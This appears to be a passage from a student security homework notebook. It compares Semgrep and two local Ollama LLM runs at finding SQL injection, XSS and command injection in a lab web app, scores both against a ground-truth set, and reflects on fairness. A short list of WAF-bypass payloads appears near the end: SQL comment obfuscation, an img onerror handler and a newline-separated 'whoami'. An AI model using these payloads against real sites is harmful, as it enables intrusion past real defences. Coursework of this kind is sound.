[ScanResult(rule='sqli', location='do_login', severity='high', tool='ollama-run-1', confidence='confirmed', raw='{"rule": "sqli", "location": "do_login", "severity": "high", "confidence": "confirmed", "evidence": "String-formatted query, no parameterization. The whole point of the SQLi lab."}'), ScanResult(rule='xss', location='do_reflect', severity='high', tool='ollama-run-1', confidence='confirmed', raw='{"rule": "xss", "location": "do_reflect", "severity": "high", "confidence": "confirmed", "evidence": "User input placed into HTML with no encoding. Fixed version is /safe, which html.escape()s the input."}'), ScanResult(rule='cmdi', location='do_ping', severity='high', tool='ollama-run-1', confidence='confirmed', raw='{"rule": "cmdi", "location": "do_ping", "severity": "high", "confidence": "confirmed", "evidence": "The host string is concatenated into a command. We SIMULATE execution (echo the command) so the lab is safe to run, but the bug — untrusted data reaching a command contex

In [29]:
print(ollama_findings_2)

[ScanResult(rule='sqli', location='do_login', severity='high', tool='ollama-run-2', confidence='confirmed', raw='{"rule": "sqli", "location": "do_login", "severity": "high", "confidence": "confirmed", "evidence": "String-formatted query, no parameterization. The whole point of the SQLi lab."}'), ScanResult(rule='xss', location='do_reflect', severity='high', tool='ollama-run-2', confidence='confirmed', raw='{"rule": "xss", "location": "do_reflect", "severity": "high", "confidence": "confirmed", "evidence": "User input placed into HTML with no encoding. Fixed version is /safe, which html.escape()s the input."}'), ScanResult(rule='cmdi', location='do_ping', severity='high', tool='ollama-run-2', confidence='confirmed', raw='{"rule": "cmdi", "location": "do_ping", "severity": "high", "confidence": "confirmed", "evidence": "The host string is concatenated into a command. We simulate execution (echo the command) so the lab is safe to run, but the bug is real and detectable."}')]


## PART C4 — Score scanner and LLM against ground truth

Each Ollama run is scored separately. This avoids cherry-picking the better run and makes the non-determinism visible in the same metric table.


In [25]:
findings_by_tool = {
    'semgrep': semgrep_findings,
    'ollama-run-1': ollama_findings_1,
    'ollama-run-2': ollama_findings_2,
}
comparison = compare_scanners(findings_by_tool, GROUND_TRUTH)
print_comparison(comparison)

for tool, score in comparison.items():
    print(f"{tool}: precision={score['precision']:.3f}, recall={score['recall']:.3f}, F1={score['f1']:.3f}")


  tool             TP   FP   FN    prec  recall     F1
  ----------------------------------------------------
  semgrep           2    0    1    100%     67%   0.80
  ollama-run-1      3    0    0    100%    100%   1.00
  ollama-run-2      3    0    0    100%    100%   1.00

  Read this like a security engineer, not a leaderboard:

  - HIGH RECALL, LOW PRECISION (finds everything, cries wolf): an LLM often lands
    here. Every false positive is analyst time; a tool that reports 40 bugs where
    6 are real will be ignored within a week.
  - HIGH PRECISION, LOW RECALL (quiet but misses things): a narrow ruleset often
    lands here. What it misses is what hurts you.
  - The interesting cell is the FALSE POSITIVES the LLM invented and the TRUE bugs
    the scanner MISSED. Print both and read them out loud — that comparison is the
    deliverable, not the F1 score.

  semgrep missed (real bugs it did not report):
      ('sqli', 'do_login')
semgrep: precision=1.000, recall=0.667, F1=0.800

## PART C5 — Hallucinations, scanner misses, and non-determinism

This cell prints the evidence the written report must name: the LLM's false positives (if any), Semgrep's worst miss, how the two model runs differ, and whether either tool claimed Broken Access Control. A model claim is not deleted merely because it is wrong; the independent truth set classifies it.


In [26]:
def raw_for_key(findings: list[ScanResult], key: tuple[str, str]) -> str:
    return next((finding.raw for finding in findings if finding.key() == key), '')


for name, findings in [('ollama-run-1', ollama_findings_1), ('ollama-run-2', ollama_findings_2)]:
    false_positives = comparison[name]['false_positives']
    print(f'\n{name} false positives / hallucinations:')
    if false_positives:
        for key in false_positives:
            print(' ', key, raw_for_key(findings, key))
    else:
        print('  none in this run')

print('\nSemgrep missed real findings:', comparison['semgrep']['missed'])

keys_1 = {finding.key() for finding in ollama_findings_1}
keys_2 = {finding.key() for finding in ollama_findings_2}
union = keys_1 | keys_2
jaccard = len(keys_1 & keys_2) / len(union) if union else 1.0
print('\nLLM non-determinism:')
print('  only run 1:', sorted(keys_1 - keys_2))
print('  only run 2:', sorted(keys_2 - keys_1))
print(f'  agreement (Jaccard): {jaccard:.3f}')

for name, findings in findings_by_tool.items():
    bac_claims = [finding for finding in findings if finding.rule == 'broken-access-control']
    print(f"{name} Broken Access Control claims: {[finding.key() for finding in bac_claims] or 'none'}")
print('Ground-truth conclusion: Broken Access Control is not present in vuln-web; any such claim is a false positive.')



ollama-run-1 false positives / hallucinations:
  none in this run

ollama-run-2 false positives / hallucinations:
  none in this run

Semgrep missed real findings: [('sqli', 'do_login')]

LLM non-determinism:
  only run 1: []
  only run 2: []
  agreement (Jaccard): 1.000
semgrep Broken Access Control claims: none
ollama-run-1 Broken Access Control claims: none
ollama-run-2 Broken Access Control claims: none
Ground-truth conclusion: Broken Access Control is not present in vuln-web; any such claim is a false positive.


## PART C6 — Save reproducible duel artifacts

This writes the raw local model outputs, model settings, normalized findings, scores, and a CSV metric table to `montero/duel/`. Commit these generated artifacts with the notebook so the reviewer can reproduce the conclusion instead of trusting a screenshot.


In [30]:
def finding_record(finding: ScanResult) -> dict:
    return {
        'rule': finding.rule, 'location': finding.location, 'severity': finding.severity,
        'tool': finding.tool, 'confidence': finding.confidence, 'raw': finding.raw,
    }


duel_dir = Path.cwd() / 'duel'
duel_dir.mkdir(exist_ok=True)
artifact = {
    'target': str(DUEL_SOURCE_PATH),
    'source_sha256': hashlib.sha256(DUEL_SOURCE.encode()).hexdigest(),
    'ground_truth': sorted(GROUND_TRUTH),
    'classical_scanner': 'semgrep custom rules embedded in notebook',
    'llm': {
        'backend': 'ollama', 'model': OLLAMA_MODEL, 'temperature': 0.7, 'seeds': [11, 29],
        'run_1': ollama_run_1.to_dict(), 'run_2': ollama_run_2.to_dict(),
    },
    'findings': {name: [finding_record(finding) for finding in findings]
                 for name, findings in findings_by_tool.items()},
    'comparison': comparison,
    'non_determinism': {
        'only_run_1': sorted(keys_1 - keys_2), 'only_run_2': sorted(keys_2 - keys_1),
        'jaccard': jaccard,
    },
}
(duel_dir / 'part_c_results.json').write_text(json.dumps(artifact, indent=2, ensure_ascii=False), encoding='utf-8')

with (duel_dir / 'part_c_metrics.csv').open('w', newline='', encoding='utf-8') as handle:
    writer = csv.DictWriter(handle, fieldnames=['tool', 'tp', 'fp', 'fn', 'precision', 'recall', 'f1'])
    writer.writeheader()
    for tool, score in comparison.items():
        writer.writerow({'tool': tool, **{key: score[key] for key in writer.fieldnames if key != 'tool'}})

print('Wrote:', duel_dir / 'part_c_results.json')
print('Wrote:', duel_dir / 'part_c_metrics.csv')


Wrote: /Users/santiagoarellano/Documents/Projects/cmp-5006E-fall26/homework/hw2/arellano/duel/part_c_results.json
Wrote: /Users/santiagoarellano/Documents/Projects/cmp-5006E-fall26/homework/hw2/arellano/duel/part_c_metrics.csv


## Part D — Where our attack, defense, or comparison might be unfair.

In this final evaluation, we chose to focus on the implementation logic rather than on the vulnerabilities completely
. In the case of the DVWA, either in Medium or Impossible levels, the application itself is a black box whose code we
 would have to find somewhere outside of the image, and would introduce bias when designing the tests implemented
 here. Meanwhile  the vulnerable web app that is built locally intentionally exposes its code as its used for
 LLM-based review, and is not directly the best way to test a WAF or a proper set of application security
 implementation as is the DVWA.

As such, in our work we focused mostly on the implementation of the attacks, the oracles, the implementation of the
LLM vs Semgrep comparison, and the WAF implementation. It is through this lense that we can attempt to measure the
fairness of our attack, defense, or comparisons. It is important to note that, despite the homework specification
determining that we *should build our own ground truths* to be used in evaluation both at the WAF stages, and the
comparison, the repository already contained the required `.json` files that could be used for either section, with
one containing bening traffic and another the ground truth for the comparison. As such, we used these files directly
as the input for both part B and C, and did not attempt to build our own ground truths.

For this reason, we believe that the fairness and independence of the ground truth is maintained, and its
reproducibility is ensured as these files are provided with the repository and are not generated by any of the tools
used in this homework. Despite this, it is possible that the ground truths might not contain as many test cases as
might be required to properly test the WAF implementation, but the ground truth information for the LLM appears to
have been built specifically for the vulnerable web application so its results *should* be considered fair and independent.

When it came to the WAF implementation, we believed that the rules we should implement should not attempt to
explicitly stop a request just because we know it would have a pattern like /**/ or – within it to try and bypass a
generalized rule, instead what we implemented were general rules that a security team might define on a WAF as a
catch all for most attacks, and then we attempted to bypass these rules with the same attacks that we had already
defined in part A and some small modifications that demonstrated how, by attempting to obfuscate the attack, we could
 bypass the WAF rules. This is a demonstration of how a WAF can be bypassed by a motivated attacker, and why it is important to have a more sophisticated approach to web application security.

Despite this, it is possible that some tests were not as fair as they could've been. For example, an attacker would
not directly try to use /**/ comment syntax on SQL injection, they might attempt to introduce a space or break down
the command using delimiters like a semicolon. Taking a look at the XSS event handler, we perhaps could've tried more
 variations of these or script tags to see if we could've bypassed the WAF by attempting to maintain the original
 structure of the attacks. This does not invalidate our testing, but it does call into question the breath of these
 tests and whether they are truly representative of the attacks that a motivated attacker might attempt.

```python
BYPASSES = [
    {
        'name': 'SQL comment-obfuscation',
        'payload': Payload('1/**/OR/**/1=1', intent='SQLi comment-obfuscation bypass', family='sqli'),
        'why': 'The WAF expects whitespace around OR; MySQL accepts comments as separators.',
        'send': send_sqli, 'oracle': sqli_oracle,
    },
    {
        'name': 'XSS event handler',
        'payload': Payload('<img src=x onerror=window.__HW2_XSS_BYPASS__=1>', intent='event-handler XSS bypass', family='xss'),
        'why': 'The WAF only recognizes a script tag, not another executable HTML context.',
        'send': send_xss, 'oracle': xss_event_oracle,
    },
    {
        'name': 'Command newline separator',
        'payload': Payload('127.0.0.1\nwhoami', intent='newline command-separator bypass', family='cmdi'),
        'why': 'The WAF blocks visible shell punctuation but not a newline command separator.',
        'send': send_cmdi, 'oracle': cmdi_oracle,
    },
]
```

Even under this analysis, it is interesting to note that the same tests that were used to bypass the WAF were also used to test the Impossible level of DVWA, and in this case, the Impossible level was able to block all of these attacks. This demonstrates that a properly implemented security model can provide stronger guarantees than a simplistic WAF implementation, and that it is important to have a more sophisticated approach to web application security.

### Further limits we found when re-reading our own evidence

**The LLM duel was easier than it looks.** `vulnweb_app.py` marks every bug with a `# VULN` comment, and the
Ollama "evidence" strings repeat those comments almost word for word ("String-formatted query, no
parameterization. The whole point of the SQLi lab."). The model's 3/3 recall therefore says more about reading
comments than about finding bugs. We did not re-run the review on a copy with the comments stripped, which is the
fairer test and the one we would expect to produce the hallucinations the course warns about. Our report has no LLM
hallucination to name because this run produced none, not because the model is reliable.

**Two identical runs are weak evidence of determinism.** Both runs returned the same three findings (Jaccard 1.0)
at temperature 0.7 with seeds 11 and 29. On a file this small, with the answers in the comments, agreement is
expected. Two runs meet the minimum the assignment asks for; they do not show the model would agree on a larger or
unlabelled codebase.

**Our B2 fix is DVWA's code, not ours.** For the positive model we replayed every payload and bypass against
DVWA's supplied Impossible level instead of writing our own parameterized query. The 0/2 results per class are real,
but the guarantee rests on DVWA's implementation, which we treated as a black box. The guarantee we can state is
conditional: user input cannot change the SQL query structure *provided* the Impossible code really uses a prepared
statement for every query on that path, and we checked that through its behaviour, not by reading its source.

**The WAF covered three classes with one bypass each.** The assignment asks for a deeper defense of one
vulnerability. We spread the blocklist across SQLi, XSS and command injection, so each class has a single same-intent
bypass instead of three. The 3/3 bypass rate is honest for the mutations we chose, but it is a small sample per class.

